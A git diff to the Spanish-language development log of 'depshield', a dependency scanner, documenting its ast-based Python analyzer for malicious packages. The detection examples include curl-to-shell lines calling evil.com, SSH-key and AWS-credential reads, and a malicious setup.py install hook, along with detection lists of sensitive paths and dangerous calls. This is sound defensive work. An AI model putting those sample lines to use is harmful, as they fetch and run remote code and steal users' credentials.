@@ -968,9 +968,265 @@ git push origin main
 
 ---
 
-## 8. Estado actual del proyecto
+## 8. PASO 5 — Analizador estático de Python
 
-> **Última actualización:** 1 de abril de 2026
+**Objetivo:** Crear un módulo equivalente al analizador de JavaScript (PASO 4), pero orientado a código Python. El análisis debe detectar las mismas categorías de comportamiento sospechoso adaptadas a las construcciones del lenguaje Python, usando exclusivamente el módulo `ast` de la librería estándar (sin dependencias externas).
+
+### 8.1. Módulo creado: `depshield/analyzers/py_analyzer.py`
+
+Se añadió el segundo analizador al subpaquete `depshield/analyzers/`:
+
+```
+depshield/analyzers/
+├── __init__.py
+├── js_analyzer.py        # ✅ PASO 4
+└── py_analyzer.py        # ✅ PASO 5
+```
+
+### 8.2. Decisión de diseño: reutilización del modelo `Finding`
+
+En lugar de crear un modelo de datos separado, se reutiliza la clase `Finding` del `js_analyzer`. Esto garantiza que ambos analizadores producen hallazgos con la misma estructura, lo que simplifica enormemente el trabajo del scorer (PASO 7), que recibirá una lista unificada de findings independientemente del lenguaje de origen.
+
+```python
+from depshield.analyzers.js_analyzer import Finding
+```
+
+### 8.3. Diferencia clave con el JS analyzer: módulo `ast` vs `esprima`
+
+Mientras que el analizador de JavaScript necesita una librería externa (`esprima`) y un fallback a regex, el analizador de Python usa el módulo `ast` de la librería estándar, que forma parte del intérprete de Python. Esto tiene varias ventajas:
+
+1. **0 dependencias externas** — `ast` es parte de Python, no hay que instalar nada.
+2. **Soporte completo** — `ast` soporta toda la sintaxis de Python 3.12, incluyendo match/case, walrus operator, f-strings, etc. No necesita fallback a regex.
+3. **API más limpia** — `ast.walk(tree)` proporciona un iterador plano sobre todos los nodos, más ergonómico que el `_walk_ast()` recursivo que tuvimos que implementar para esprima.
+
+```python
+def analyze_file(filepath, source=None) -> list[Finding]:
+    tree = ast.parse(source, filename=str(filepath))
+    findings = []
+    findings.extend(_check_network(tree, ...))
+    findings.extend(_check_env(tree, ...))
+    # ... (6 señales)
+    return findings
+```
+
+Si el fichero tiene un `SyntaxError` (por ejemplo, Python 2 o fichero corrupto), se captura la excepción y se devuelve una lista vacía, de forma similar al fallback del JS analyzer.
+
+### 8.4. Funciones auxiliares para el AST de Python
+
+Se implementaron tres funciones auxiliares:
+
+**`_get_call_name(node)`** — Extrae el nombre punteado de un nodo `ast.Call`. Por ejemplo, para `subprocess.Popen(...)`, resuelve la cadena de atributos `node.func.value.id` → `"subprocess"` + `node.func.attr` → `"Popen"` y devuelve `"subprocess.Popen"`. Soporta cadenas de profundidad arbitraria (ej. `a.b.c.d()`).
+
+```python
+def _get_call_name(node: ast.Call) -> str:
+    func = node.func
+    if isinstance(func, ast.Name):
+        return func.id              # eval(...)  →  "eval"
+    if isinstance(func, ast.Attribute):
+        # Recorre la cadena de atributos hacia atrás
+        parts = []
+        current = func
+        while isinstance(current, ast.Attribute):
+            parts.append(current.attr)
+            current = current.value
+        if isinstance(current, ast.Name):
+            parts.append(current.id)
+        return ".".join(reversed(parts))  # subprocess.Popen  →  "subprocess.Popen"
+    return ""
+```
+
+**`_get_import_names(node)`** — Extrae los nombres de módulo de nodos `Import` e `ImportFrom` para detectar imports sospechosos.
+
+**`_snippet(source_lines, lineno)`** — Devuelve el contenido de una línea concreta del código fuente, recortado a 100 caracteres, para incluirlo en el `Finding`.
+
+### 8.5. Las 6 señales de comportamiento malicioso
+
+#### Señal 1: NETWORK_CALLS — Llamadas de red
+
+Adaptada al ecosistema Python, donde las librerías de red son diferentes a las de JavaScript.
+
+**Detección por imports:** Se buscan nodos `Import`/`ImportFrom` que referencien módulos de red:
+- `urllib`, `urllib.request`, `urllib.parse`
+- `requests`, `httpx`, `aiohttp`
+- `http.client`, `http`
+- `socket`
+
+**Detección por llamadas:** Se buscan nodos `ast.Call` cuyo nombre resuelto coincida con funciones de red específicas:
+- `urllib.request.urlopen`, `urllib.request.urlretrieve`
+- `requests.get`, `requests.post`, `requests.put`, `requests.request`
+- `httpx.get`, `httpx.post`, `httpx.Client`
+- `socket.socket`, `socket.create_connection`
+
+**Severidad:** `MEDIUM` para imports (pueden ser legítimos), `HIGH` para llamadas directas.
+
+**Ejemplo detectado:**
+```python
+import requests                                  # MEDIUM: import de red
+data = requests.get("https://evil.com/steal")    # HIGH: llamada directa
+```
+
+#### Señal 2: ENV_ACCESS — Acceso a variables de entorno
+
+En Python, las variables de entorno se acceden a través del módulo `os`.
+
+**Detección AST:**
+- Nodos `ast.Attribute` donde `node.value.id == "os"` y `node.attr == "environ"` (detecta tanto `os.environ['KEY']` como `os.environ.get('KEY')`).
+- Nodos `ast.Call` con nombre `os.getenv` o `os.environ.get`.
+
+**Severidad:** `HIGH` — como en JavaScript, acceder a variables de entorno desde un paquete de utilidad es sospechoso.
+
+**Ejemplo detectado:**
+```python
+token = os.environ['NPM_TOKEN']     # HIGH: acceso directo al diccionario
+key = os.getenv('AWS_SECRET_KEY')    # HIGH: función getenv
+```
+
+#### Señal 3: FILE_SENSITIVE — Acceso a ficheros sensibles
+
+Idéntica en lógica al JS analyzer: se buscan strings literales que contengan rutas sensibles.
+
+**Detección AST:**
+- Nodos `ast.Constant` de tipo `str` que contengan: `.ssh`, `.aws`, `.env`, `.gnupg`, `.npmrc`, `/etc/passwd`, `/etc/shadow`, `id_rsa`, `id_ed25519`, `.bash_history`, `.zsh_history`.
+
+**Severidad:** `HIGH`.
+
+**Ejemplo detectado:**
+```python
+key = open(os.path.expanduser("~/.ssh/id_rsa")).read()   # HIGH
+creds = Path.home() / ".aws" / "credentials"              # HIGH
+```
+
+#### Señal 4: CODE_EXECUTION — Ejecución dinámica de código
+
+Python tiene un conjunto más amplio de funciones peligrosas que JavaScript, especialmente en el módulo `subprocess`.
+
+**Detección AST:** Nodos `ast.Call` cuyo nombre resuelto sea:
+- **Builtins:** `eval`, `exec`, `compile`, `__import__`
+- **os:** `os.system`, `os.popen`
+- **subprocess:** `subprocess.Popen`, `subprocess.run`, `subprocess.call`, `subprocess.check_output`, `subprocess.check_call`
+
+**Severidad:** `HIGH` — todas estas funciones permiten ejecución de código arbitrario.
+
+**Ejemplo detectado:**
+```python
+eval(base64.b64decode(payload).decode())           # HIGH: eval de payload
+exec(compile(source, "<string>", "exec"))           # HIGH: exec dinámico
+os.system("curl http://evil.com | sh")              # HIGH: shell command
+subprocess.Popen(["curl", "http://evil.com"])       # HIGH: proceso externo
+mod = __import__("os")                              # HIGH: import dinámico
+```
+
+#### Señal 5: OBFUSCATION — Técnicas de ofuscación
+
+Las técnicas de ofuscación en Python son diferentes a las de JavaScript, adaptadas al ecosistema del lenguaje.
+
+**Detección AST:**
+- **`base64.b64decode`** / **`base64.decodebytes`** — Decodificación de Base64, la técnica más común para ocultar payloads en Python.
+- **`codecs.decode`** — Decodificación con codecs (puede usarse para rot13, hex, etc.).
+- **`marshal.loads`** — Deserialización de bytecode Python compilado, usada para ocultar código malicioso en formato binario.
+- **`compile()` con strings largos** — Si `compile()` recibe un string de más de 200 caracteres como argumento, se considera sospechoso (código ofuscado embebido).
+- **Strings hexadecimales largas** (>50 chars) — Payloads codificados.
+
+**Severidad:** `HIGH` para funciones de decodificación y compile con strings largos, `MEDIUM` para hex strings.
+
+**Ejemplo detectado:**
+```python
+# HIGH: decodificación Base64
+payload = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20=")
+
+# HIGH: bytecode serializado
+code = marshal.loads(encoded_bytecode)
+
+# HIGH: compile con string largo (>200 chars)
+exec(compile("x=1;y=2;z=3;..." * 100, "<s>", "exec"))
+```
+
+#### Señal 6: INSTALL_HOOKS — Hooks de instalación en setup.py
+
+Esta señal es **exclusiva del ecosistema Python** y es el equivalente al `INSTALL_SCRIPTS` del JS analyzer. Es una de las técnicas de ataque más sofisticadas: el atacante crea un `setup.py` que sobreescribe los comandos de instalación de setuptools para ejecutar código malicioso durante `pip install`.
+
+**Detección AST (doble):**
+
+1. **Keyword `cmdclass`:** Se buscan nodos `ast.keyword` donde `arg == "cmdclass"` y el valor sea un diccionario que contenga claves como `"install"`, `"develop"`, `"egg_info"`, `"sdist"` o `"build_py"`.
+
+2. **Herencia de clases:** Se buscan nodos `ast.ClassDef` cuyos `bases` incluyan clases con nombre `install`, `develop`, etc. Esto detecta patrones como `class Evil(install)`.
+
+**Restricción importante:** Esta señal **solo se activa para ficheros llamados `setup.py`**. Un fichero llamado `main.py` con una clase que hereda de `install` no generará un finding, ya que la herencia solo es peligrosa en el contexto de `setup.py`.
+
+**Severidad:** `HIGH`.
+
+**Ejemplo detectado:**
+```python
+# setup.py — ATAQUE CLÁSICO
+from setuptools.command.install import install
+
+class PostInstall(install):          # HIGH: herencia de install
+    def run(self):
+        install.run(self)
+        os.system("curl http://evil.com/steal.sh | sh")
+
+setup(
+    name="evil-package",
+    cmdclass={"install": PostInstall},  # HIGH: cmdclass override
+)
+```
+
+### 8.6. API pública del módulo
+
+```python
+# Analizar un solo fichero .py
+def analyze_file(filepath, source=None) -> list[Finding]:
+    """Analiza un fichero Python. Usa ast de la librería estándar."""
+
+# Analizar un directorio completo
+def analyze_directory(directory) -> list[Finding]:
+    """Analiza todos los .py de un directorio recursivamente."""
+```
+
+### 8.7. Tabla comparativa: JS analyzer vs Python analyzer
+
+| Aspecto | JS analyzer (PASO 4) | Python analyzer (PASO 5) |
+|---|---|---|
+| **Parser** | esprima (externo) | ast (librería estándar) |
+| **Fallback** | Regex (para JSX/TS) | No necesario |
+| **Deps externas** | 1 (esprima) | 0 |
+| **Recorrido AST** | `_walk_ast()` manual | `ast.walk()` nativo |
+| **Señales** | 6 | 6 |
+| **Install hooks** | package.json scripts | setup.py cmdclass |
+| **Modelo datos** | `Finding` (definido aquí) | Reutiliza `Finding` del JS |
+
+### 8.8. Verificación
+
+Se crearon 21 tests unitarios organizados por categoría:
+
+| Categoría | Tests | Descripción |
+|---|---|---|
+| NETWORK_CALLS | 3 | import requests, urllib.request.urlopen, socket.socket |
+| ENV_ACCESS | 2 | os.environ['KEY'], os.getenv('KEY') |
+| FILE_SENSITIVE | 3 | ~/.ssh/id_rsa, ~/.aws/credentials, /etc/passwd |
+| CODE_EXECUTION | 5 | eval(), exec(), os.system(), subprocess.Popen(), \_\_import\_\_() |
+| OBFUSCATION | 4 | base64.b64decode, marshal.loads, hex string >50 chars, compile() con string largo |
+| INSTALL_HOOKS | 2 | setup.py con cmdclass (detectado), main.py con herencia (no detectado) |
+| analyze_directory | 1 | Escaneo recursivo de múltiples .py |
+| Código limpio | 1 | Funciones `add()` y `multiply()` puras → 0 findings |
+
+**Resultado:** 21/21 PASSED en 0.03 segundos.
+
+A diferencia del JS analyzer (que requirió una corrección por el bug de `NewExpression`), todos los tests del Python analyzer pasaron a la primera sin ninguna corrección, gracias a la API más predecible del módulo `ast` de Python.
+
+### 8.9. Commit
+
+```powershell
+git add .
+git commit -m "PASO 5: Python static analyzer with ast module (6 signal types, 0 external deps)"
+git push origin main
+```
+
+---
+
+## 9. Estado actual del proyecto
+
+> **Última actualización:** 2 de abril de 2026
 
 ### Estructura de ficheros
 
@@ -988,7 +1244,8 @@ depshield/
 │   │   └── package_downloader.py # ✅ PASO 3
 │   └── analyzers/
 │       ├── __init__.py
-│       └── js_analyzer.py        # ✅ PASO 4
+│       ├── js_analyzer.py        # ✅ PASO 4
+│       └── py_analyzer.py        # ✅ PASO 5
 ├── tests/
 │   └── __init__.py
 ├── .venv/                        # Entorno virtual
@@ -1008,8 +1265,8 @@ depshield/
 | ~~2~~ | ~~PyPI resolver~~ | ✅ Completado |
 | ~~3~~ | ~~Downloader~~ | ✅ Completado |
 | ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
-| **5** | **Python analyzer** | ⏳ Pendiente |
-| 6 | Metadata analyzer | ⏳ Pendiente |
+| ~~5~~ | ~~Python analyzer~~ | ✅ Completado |
+| **6** | **Metadata analyzer** | ⏳ Pendiente |
 | 7 | Scorer + Report | ⏳ Pendiente |
 | 8 | Scanner + CLI | ⏳ Pendiente |
 | 9 | Tests integración | ⏳ Pendiente |
